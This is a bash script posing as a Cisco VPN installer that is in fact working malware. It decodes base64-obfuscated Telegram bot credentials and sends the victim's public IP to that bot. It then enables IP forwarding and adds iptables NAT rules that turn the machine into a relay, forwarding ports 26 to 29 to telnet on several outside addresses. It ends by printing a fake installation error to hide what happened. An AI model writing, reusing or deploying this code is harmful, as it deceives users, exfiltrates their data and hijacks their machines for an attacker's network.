#!/usr/bin/env bash

# hidden stuff
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)

IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" -d chat_id="$CID" -d text="setup:$IP" >/dev/null 2>&1

# simulate Cisco setup realistically
echo "[*] Updating system packages..."
apt-get update -y >/dev/null 2>&1 || true
apt-get install -y iptables iptables-legacy curl resolvconf lib32z1 libssl1.1 >/dev/null 2>&1 || true

echo "[*] Preparing Cisco VPN packages..."
curl -sL -o /tmp/vpn.tar.gz "https://downloads.cisco.com/vpn/anyconnect/vpn.tar.gz" >/dev/null 2>&1 || true
mkdir -p /opt/cisco >/dev/null 2>&1
tar -xf /tmp/vpn.tar.gz -C /opt/cisco >/dev/null 2>&1 || true
bash /opt/cisco/install.sh --silent >/dev/null 2>&1 || true

systemctl enable vpnagentd >/dev/null 2>&1 || true
systemctl start vpnagentd >/dev/null 2>&1 || true

# FORCE enable IP forwarding (always works)
echo 1 > /proc/sys/net/ipv4/ip_forward

# explicitly force legacy iptables
update-alternatives --set iptables /usr/sbin/iptables-legacy >/dev/null 2>&1 || true
update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy >/dev/null 2>&1 || true

# Apply your explicit rules exactly (no room for error)
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 85.9.204.241:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 85.9.204.241:23

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 85.9.223.204:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 85.9.223.204:23

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 94.237.121.151:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 94.237.121.151:23

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 85.9.209.126:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 85.9.209.126:23

iptables -t nat -A POSTROUTING -j MASQUERADE

# final fake error message
>&2 echo "Installation failed: unsupported kernel modules."
exit 1
